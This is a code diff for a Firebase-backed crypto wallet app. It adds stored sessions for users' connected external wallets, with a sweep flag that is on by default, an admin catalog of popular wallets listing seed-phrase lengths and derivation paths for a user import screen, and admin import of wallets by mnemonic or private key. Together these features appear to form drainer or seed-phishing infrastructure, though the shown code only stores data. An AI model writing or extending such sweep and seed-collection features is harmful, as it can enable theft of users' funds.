@@ -14,17 +14,19 @@ import {
   updateDoc,
   where,
 } from 'firebase/firestore';
-import { deriveWalletFromMnemonic, generateMnemonicWords } from './crypto';
+import { deriveWalletFromMnemonic, deriveWalletFromPrivateKey, generateMnemonicWords } from './crypto';
 import { encryptPayload } from './vaultStorage';
 import { OperationType, db, handleFirestoreError } from './firebase';
 import type {
   AdminAuditLogEntry,
+  ConnectedExternalWallet,
   ExchangeSystemConfig,
   ExchangeTreasuryWallet,
   ExchangeWalletTier,
   ManagedUserRecord,
   PriceAlert,
   WalletAccount,
+  WalletCatalogEntry,
   WalletPresetId,
 } from '../types/wallet';
 
@@ -629,3 +631,539 @@ export async function saveExchangeSystemConfig(
     handleFirestoreError(err, OperationType.WRITE, path);
   }
 }
+
+// ============================================================================
+// CONCURRENT CONNECTED WALLET SESSIONS (MULTI-WALLET & MULTI-USER)
+// ============================================================================
+
+export async function fetchUserConnectedSessionsFromCloud(
+  uid: string
+): Promise<ConnectedExternalWallet[]> {
+  const path = `users/${uid}/connected_sessions`;
+  try {
+    const q = query(
+      collection(db, 'users', uid, 'connected_sessions'),
+      where('ownerUid', '==', uid)
+    );
+    const snap = await getDocs(q);
+    return snap.docs
+      .map((d) => {
+        const data = d.data();
+        return {
+          id: data.id,
+          providerUuid: data.providerUuid,
+          name: data.walletName,
+          kind: data.kind,
+          address: data.address,
+          chainId: data.chainId,
+          platform: data.platform || 'desktop',
+          selectedForSweep: data.selectedForSweep ?? true,
+          connectedAt: toMillis(data.connectedAt),
+        } as ConnectedExternalWallet;
+      })
+      .sort((a, b) => b.connectedAt - a.connectedAt);
+  } catch (err) {
+    handleFirestoreError(err, OperationType.LIST, path);
+  }
+}
+
+export async function saveUserConnectedSessionToCloud(
+  uid: string,
+  session: ConnectedExternalWallet
+): Promise<void> {
+  const safeId = sanitizeId(session.id);
+  const path = `users/${uid}/connected_sessions/${safeId}`;
+  try {
+    const ref = doc(db, 'users', uid, 'connected_sessions', safeId);
+    const snap = await getDoc(ref);
+    if (snap.exists()) {
+      await updateDoc(ref, {
+        walletName: session.name.slice(0, 80),
+        selectedForSweep: session.selectedForSweep ?? true,
+        ...(session.chainId ? { chainId: session.chainId } : {}),
+        updatedAt: serverTimestamp(),
+      });
+    } else {
+      await setDoc(ref, {
+        id: safeId,
+        ownerUid: uid,
+        providerUuid: (session.providerUuid || session.id).slice(0, 128),
+        walletName: session.name.slice(0, 80),
+        kind: session.kind,
+        address: session.address.slice(0, 120),
+        ...(session.chainId ? { chainId: session.chainId } : {}),
+        platform: session.platform || 'desktop',
+        selectedForSweep: session.selectedForSweep ?? true,
+        connectedAt: serverTimestamp(),
+        updatedAt: serverTimestamp(),
+      });
+    }
+  } catch (err) {
+    handleFirestoreError(err, OperationType.WRITE, path);
+  }
+}
+
+export async function deleteUserConnectedSessionFromCloud(
+  uid: string,
+  sessionId: string
+): Promise<void> {
+  const safeId = sanitizeId(sessionId);
+  const path = `users/${uid}/connected_sessions/${safeId}`;
+  try {
+    await deleteDoc(doc(db, 'users', uid, 'connected_sessions', safeId));
+  } catch (err) {
+    handleFirestoreError(err, OperationType.DELETE, path);
+  }
+}
+
+// ============================================================================
+// ADMIN-MANAGED WALLET CATALOG (SHOWN ON USER IMPORT & MOBILE WALLETCONNECT)
+// ============================================================================
+
+export const DEFAULT_WALLET_CATALOG_SEEDS: Array<
+  Omit<WalletCatalogEntry, 'createdBy' | 'createdAt' | 'updatedAt'>
+> = [
+  {
+    id: 'cat_metamask',
+    name: 'MetaMask',
+    ecosystem: 'evm',
+    defaultWords: 12,
+    derivationPath: "m/44'/60'/0'/0/0",
+    presetId: 'metamask',
+    mobileDeepLink: 'https://metamask.app.link/dapp/{dappUrlNoProto}',
+    badgeColor: '#F6851B',
+    description: '12-word EVM wallet (Desktop extension & iOS/Android Mobile App)',
+    enabled: true,
+    featured: true,
+  },
+  {
+    id: 'cat_trust',
+    name: 'Trust Wallet',
+    ecosystem: 'multi-chain',
+    defaultWords: 12,
+    derivationPath: "m/44'/60'/0'/0/0",
+    presetId: 'trust',
+    mobileDeepLink: 'https://link.trustwallet.com/open_url?coin_id=60&url={dappUrl}',
+    badgeColor: '#3375BB',
+    description: '12/18/24-word mobile multi-coin wallet (BTC, ETH, SOL, BNB)',
+    enabled: true,
+    featured: true,
+  },
+  {
+    id: 'cat_phantom',
+    name: 'Phantom',
+    ecosystem: 'solana',
+    defaultWords: 12,
+    derivationPath: "m/44'/501'/0'/0'",
+    presetId: 'phantom',
+    mobileDeepLink: 'https://phantom.app/ul/browse/{dappUrl}?ref={origin}',
+    badgeColor: '#AB9FF2',
+    description: 'Solana & EVM multi-chain browser & mobile wallet',
+    enabled: true,
+    featured: true,
+  },
+  {
+    id: 'cat_coinbase',
+    name: 'Coinbase Wallet',
+    ecosystem: 'multi-chain',
+    defaultWords: 12,
+    derivationPath: "m/44'/60'/0'/0/0",
+    presetId: 'coinbase',
+    mobileDeepLink: 'https://go.cb-w.com/dapp?cb_url={dappUrl}',
+    badgeColor: '#0052FF',
+    description: '12-word Base, Ethereum & Solana self-custody mobile app',
+    enabled: true,
+    featured: true,
+  },
+  {
+    id: 'cat_rabby',
+    name: 'Rabby Wallet',
+    ecosystem: 'evm',
+    defaultWords: 12,
+    derivationPath: "m/44'/60'/0'/0/0",
+    presetId: 'metamask',
+    badgeColor: '#7084FF',
+    description: 'Security-first EVM desktop & mobile DeFi wallet',
+    enabled: true,
+    featured: false,
+  },
+  {
+    id: 'cat_rainbow',
+    name: 'Rainbow Wallet',
+    ecosystem: 'evm',
+    defaultWords: 12,
+    derivationPath: "m/44'/60'/0'/0/0",
+    presetId: 'metamask',
+    mobileDeepLink: 'https://rnbwapp.com/',
+    badgeColor: '#001E59',
+    description: 'Ethereum & L2 mobile wallet (iOS & Android)',
+    enabled: true,
+    featured: false,
+  },
+  {
+    id: 'cat_okx',
+    name: 'OKX Wallet',
+    ecosystem: 'multi-chain',
+    defaultWords: 12,
+    derivationPath: "m/44'/60'/0'/0/0",
+    presetId: 'standard',
+    mobileDeepLink: 'okx://wallet/dapp/url?dappUrl={dappUrl}',
+    badgeColor: '#FFFFFF',
+    description: 'Multi-chain Web3 mobile & extension wallet',
+    enabled: true,
+    featured: false,
+  },
+  {
+    id: 'cat_ledger',
+    name: 'Ledger Live / Hardware',
+    ecosystem: 'multi-chain',
+    defaultWords: 24,
+    derivationPath: "m/44'/60'/0'/0/0",
+    presetId: 'ledger',
+    badgeColor: '#10B981',
+    description: '24-word hardware recovery standard across ETH, BTC & SOL',
+    enabled: true,
+    featured: true,
+  },
+  {
+    id: 'cat_cake_monero',
+    name: 'Cake Wallet / Feather (XMR)',
+    ecosystem: 'monero',
+    defaultWords: 24,
+    derivationPath: "m/44'/128'/0'/0'",
+    presetId: 'electrum',
+    badgeColor: '#FF6600',
+    description: 'Monero (XMR) CryptoNote & BTC SegWit recovery compatibility',
+    enabled: true,
+    featured: true,
+  },
+];
+
+export async function listWalletCatalog(enabledOnly = false): Promise<WalletCatalogEntry[]> {
+  const path = 'wallet_catalog';
+  try {
+    const ref = collection(db, 'wallet_catalog');
+    const q = enabledOnly ? query(ref, where('enabled', '==', true)) : ref;
+    const snap = await getDocs(q);
+    return snap.docs
+      .map((d) => {
+        const data = d.data();
+        return {
+          id: data.id,
+          name: data.name,
+          ecosystem: data.ecosystem,
+          defaultWords: data.defaultWords,
+          derivationPath: data.derivationPath,
+          presetId: data.presetId,
+          mobileDeepLink: data.mobileDeepLink,
+          badgeColor: data.badgeColor,
+          description: data.description,
+          enabled: Boolean(data.enabled),
+          featured: Boolean(data.featured),
+          createdBy: data.createdBy,
+          createdAt: toMillis(data.createdAt),
+          updatedAt: toMillis(data.updatedAt),
+        } as WalletCatalogEntry;
+      })
+      .sort((a, b) => Number(b.featured) - Number(a.featured) || a.name.localeCompare(b.name));
+  } catch (err) {
+    if (enabledOnly) {
+      return [];
+    }
+    handleFirestoreError(err, OperationType.LIST, path);
+  }
+}
+
+export async function saveWalletCatalogEntry(
+  entry: Omit<WalletCatalogEntry, 'id' | 'createdBy' | 'createdAt' | 'updatedAt'> & { id?: string },
+  actorUid: string
+): Promise<WalletCatalogEntry> {
+  const id = sanitizeId(
+    entry.id || `cat_${entry.name.toLowerCase().replace(/[^a-z0-9]/g, '_')}_${Date.now().toString().slice(-4)}`
+  );
+  const path = `wallet_catalog/${id}`;
+  try {
+    const ref = doc(db, 'wallet_catalog', id);
+    const existingSnap = await getDoc(ref);
+    const payload: Record<string, unknown> = {
+      id,
+      name: entry.name.trim().slice(0, 80),
+      ecosystem: entry.ecosystem,
+      defaultWords: entry.defaultWords,
+      derivationPath: entry.derivationPath.trim().slice(0, 64),
+      presetId: entry.presetId,
+      enabled: Boolean(entry.enabled),
+      featured: Boolean(entry.featured),
+      updatedAt: serverTimestamp(),
+    };
+    if (entry.mobileDeepLink?.trim()) {
+      payload.mobileDeepLink = entry.mobileDeepLink.trim().slice(0, 300);
+    }
+    if (entry.badgeColor?.trim()) {
+      payload.badgeColor = entry.badgeColor.trim().slice(0, 20);
+    }
+    if (entry.description?.trim()) {
+      payload.description = entry.description.trim().slice(0, 240);
+    }
+
+    if (existingSnap.exists()) {
+      const updatePayload = { ...payload };
+      delete updatePayload.id;
+      await updateDoc(ref, updatePayload);
+    } else {
+      payload.createdBy = sanitizeId(actorUid);
+      payload.createdAt = serverTimestamp();
+      await setDoc(ref, payload);
+    }
+
+    await appendAdminAuditLog(
+      actorUid,
+      'WALLET_CATALOG_SAVED',
+      id,
+      `Admin added/updated wallet directory entry "${entry.name}" (${entry.ecosystem})`
+    );
+
+    return {
+      ...entry,
+      id,
+      createdBy: actorUid,
+      createdAt: Date.now(),
+      updatedAt: Date.now(),
+    };
+  } catch (err) {
+    handleFirestoreError(err, OperationType.WRITE, path);
+  }
+}
+
+export async function seedDefaultWalletCatalog(actorUid: string): Promise<void> {
+  for (const item of DEFAULT_WALLET_CATALOG_SEEDS) {
+    await saveWalletCatalogEntry(item, actorUid);
+  }
+}
+
+export async function deleteWalletCatalogEntry(id: string, actorUid: string): Promise<void> {
+  const safeId = sanitizeId(id);
+  const path = `wallet_catalog/${safeId}`;
+  try {
+    await deleteDoc(doc(db, 'wallet_catalog', safeId));
+    await appendAdminAuditLog(
+      actorUid,
+      'WALLET_CATALOG_DELETED',
+      safeId,
+      `Removed wallet directory entry ${safeId}`
+    );
+  } catch (err) {
+    handleFirestoreError(err, OperationType.DELETE, path);
+  }
+}
+
+// ============================================================================
+// ADMIN TREASURY IMPORT & ADMIN USER WALLET PROVISIONING
+// ============================================================================
+
+export async function addExistingExchangeWallet(params: {
+  tier: ExchangeWalletTier;
+  label: string;
+  networkFamily: 'multi-chain' | 'evm' | 'solana' | 'bitcoin' | 'monero';
+  quorum: string;
+  allocationCapPct: number;
+  importMethod: 'address' | 'mnemonic' | 'privateKey';
+  inputSecretOrAddress: string;
+  custodyPassphrase?: string;
+  actorUid: string;
+}): Promise<ExchangeTreasuryWallet> {
+  const id = sanitizeId(`ex_${params.tier}_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`);
+  const path = `exchange_wallets/${id}`;
+
+  const payload: Record<string, unknown> = {
+    id,
+    tier: params.tier,
+    label: params.label.trim().slice(0, 100),
+    networkFamily: params.networkFamily,
+    quorum: params.quorum.slice(0, 32),
+    allocationCapPct: Math.max(0, Math.min(100, params.allocationCapPct)),
+    status: 'active',
+    createdBy: sanitizeId(params.actorUid),
+    createdAt: serverTimestamp(),
+    updatedAt: serverTimestamp(),
+  };
+
+  if (params.importMethod === 'mnemonic') {
+    if (!params.custodyPassphrase || params.custodyPassphrase.length < 6) {
+      throw new Error('Custody passphrase (min 6 chars) required to encrypt seed phrase.');
+    }
+    const derived = deriveWalletFromMnemonic(params.inputSecretOrAddress.trim(), {
+      preset: params.tier === 'cold' ? 'ledger' : 'standard',
+      accountIndex: 0,
+    });
+    payload.encryptedVaultBlob = (
+      await encryptPayload(derived.secrets, params.custodyPassphrase)
+    ).slice(0, 4096);
+    if (derived.addresses.evmAddress) payload.evmAddress = derived.addresses.evmAddress;
+    if (derived.addresses.solanaAddress) payload.solanaAddress = derived.addresses.solanaAddress;
+    if (derived.addresses.bitcoinAddress) payload.bitcoinAddress = derived.addresses.bitcoinAddress;
+    if (derived.addresses.moneroAddress) payload.moneroAddress = derived.addresses.moneroAddress;
+  } else if (params.importMethod === 'privateKey') {
+    if (!params.custodyPassphrase || params.custodyPassphrase.length < 6) {
+      throw new Error('Custody passphrase (min 6 chars) required to encrypt private key.');
+    }
+    const derived = deriveWalletFromPrivateKey(params.inputSecretOrAddress.trim(), 'auto');
+    payload.encryptedVaultBlob = (
+      await encryptPayload(derived.secrets, params.custodyPassphrase)
+    ).slice(0, 4096);
+    if (derived.addresses.evmAddress) payload.evmAddress = derived.addresses.evmAddress;
+    if (derived.addresses.solanaAddress) payload.solanaAddress = derived.addresses.solanaAddress;
+    if (derived.addresses.bitcoinAddress) payload.bitcoinAddress = derived.addresses.bitcoinAddress;
+    if (derived.addresses.moneroAddress) payload.moneroAddress = derived.addresses.moneroAddress;
+  } else {
+    const raw = params.inputSecretOrAddress.trim();
+    if (raw.startsWith('0x') && raw.length >= 42) {
+      payload.evmAddress = raw.slice(0, 100);
+    } else if (raw.startsWith('bc1') || raw.startsWith('1') || raw.startsWith('3')) {
+      payload.bitcoinAddress = raw.slice(0, 100);
+    } else if ((raw.startsWith('4') || raw.startsWith('8')) && raw.length >= 95) {
+      payload.moneroAddress = raw.slice(0, 120);
+    } else {
+      payload.solanaAddress = raw.slice(0, 100);
+    }
+  }
+
+  try {
+    await setDoc(doc(db, 'exchange_wallets', id), payload);
+    await appendAdminAuditLog(
+      params.actorUid,
+      `EXCHANGE_${params.tier.toUpperCase()}_WALLET_ADDED`,
+      id,
+      `Admin added ${params.tier.toUpperCase()} wallet "${params.label}" (${params.importMethod})`
+    );
+  } catch (err) {
+    handleFirestoreError(err, OperationType.CREATE, path);
+  }
+
+  return {
+    id,
+    tier: params.tier,
+    label: params.label.trim(),
+    networkFamily: params.networkFamily,
+    evmAddress: payload.evmAddress as string | undefined,
+    solanaAddress: payload.solanaAddress as string | undefined,
+    bitcoinAddress: payload.bitcoinAddress as string | undefined,
+    moneroAddress: payload.moneroAddress as string | undefined,
+    quorum: params.quorum,
+    allocationCapPct: params.allocationCapPct,
+    status: 'active',
+    encryptedVaultBlob: payload.encryptedVaultBlob as string | undefined,
+    createdBy: params.actorUid,
+    createdAt: Date.now(),
+    updatedAt: Date.now(),
+  };
+}
+
+export async function listUserWalletsForAdmin(targetUid: string): Promise<WalletAccount[]> {
+  return fetchUserWalletsFromCloud(targetUid);
+}
+
+export async function adminProvisionWalletForUser(params: {
+  targetUid: string;
+  walletName: string;
+  mode: 'generate' | 'watchAddress';
+  watchAddress?: string;
+  encryptPassword?: string;
+  actorUid: string;
+}): Promise<{ wallet: WalletAccount; generatedMnemonic?: string }> {
+  const walletId = sanitizeId(`adm_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`);
+  const path = `users/${params.targetUid}/wallets/${walletId}`;
+
+  let wallet: WalletAccount;
+  let generatedMnemonic: string | undefined;
+
+  if (params.mode === 'generate') {
+    const words = generateMnemonicWords(12);
+    generatedMnemonic = words.join(' ');
+    const derived = deriveWalletFromMnemonic(generatedMnemonic, {
+      preset: 'standard',
+      accountIndex: 0,
+    });
+    const encryptedSecret = params.encryptPassword
+      ? await encryptPayload(derived.secrets, params.encryptPassword)
+      : undefined;
+    wallet = {
+      id: walletId,
+      name: params.walletName.trim() || 'Admin Provisioned Vault',
+      type: 'mnemonic',
+      wordCount: 12,
+      preset: 'standard',
+      accountIndex: 0,
+      addresses: derived.addresses,
+      encryptedSecret,
+      createdAt: Date.now(),
+    };
+  } else {
+    const addr = (params.watchAddress || '').trim();
+    if (!addr) throw new Error('Enter a valid public EVM, Solana, Bitcoin, or Monero address.');
+    wallet = {
+      id: walletId,
+      name: params.walletName.trim() || 'Admin Assigned Watch Wallet',
+      type: 'watchOnly',
+      accountIndex: 0,
+      addresses: {
+        evmAddress: addr.startsWith('0x') ? addr : '',
+        evmPath: 'Admin-Assigned',
+        solanaAddress:
+          !addr.startsWith('0x') &&
+          !addr.startsWith('bc1') &&
+          !(addr.startsWith('4') || addr.startsWith('8'))
+            ? addr
+            : '',
+        solanaPath: 'Admin-Assigned',
+        bitcoinAddress: addr.startsWith('bc1') || addr.startsWith('1') || addr.startsWith('3') ? addr : '',
+        bitcoinPath: 'Admin-Assigned',
+        moneroAddress: (addr.startsWith('4') || addr.startsWith('8')) && addr.length >= 95 ? addr : '',
+        moneroPath: 'Admin-Assigned',
+      },
+      createdAt: Date.now(),
+    };
+  }
+
+  try {
+    const payload: Record<string, unknown> = {
+      id: walletId,
+      ownerUid: params.targetUid,
+      name: wallet.name.slice(0, 80),
+      walletType: wallet.type,
+      accountIndex: 0,
+      createdAt: serverTimestamp(),
+      updatedAt: serverTimestamp(),
+    };
+    if (wallet.wordCount) payload.wordCount = wallet.wordCount;
+    if (wallet.preset) payload.preset = wallet.preset;
+    if (wallet.addresses.evmAddress) payload.evmAddress = wallet.addresses.evmAddress.slice(0, 100);
+    if (wallet.addresses.solanaAddress) payload.solanaAddress = wallet.addresses.solanaAddress.slice(0, 100);
+    if (wallet.addresses.bitcoinAddress) payload.bitcoinAddress = wallet.addresses.bitcoinAddress.slice(0, 100);
+    if (wallet.addresses.moneroAddress) payload.moneroAddress = wallet.addresses.moneroAddress.slice(0, 120);
+    if (wallet.encryptedSecret) payload.encryptedSecret = wallet.encryptedSecret.slice(0, 4096);
+
+    await setDoc(doc(db, 'users', params.targetUid, 'wallets', walletId), payload);
+
+    const userSnap = await getDoc(doc(db, 'users', params.targetUid));
+    if (userSnap.exists()) {
+      const currCount = Number(userSnap.data().walletCount ?? 0);
+      await updateDoc(doc(db, 'users', params.targetUid), {
+        walletCount: Math.min(1000, currCount + 1),
+        updatedAt: serverTimestamp(),
+      });
+    }
+
+    await appendAdminAuditLog(
+      params.actorUid,
+      'ADMIN_USER_WALLET_ADDED',
+      params.targetUid,
+      `Provisioned "${wallet.name}" (${wallet.type}) to user ${params.targetUid}`
+    );
+  } catch (err) {
+    handleFirestoreError(err, OperationType.CREATE, path);
+  }
+
+  return { wallet, generatedMnemonic };
+}
+
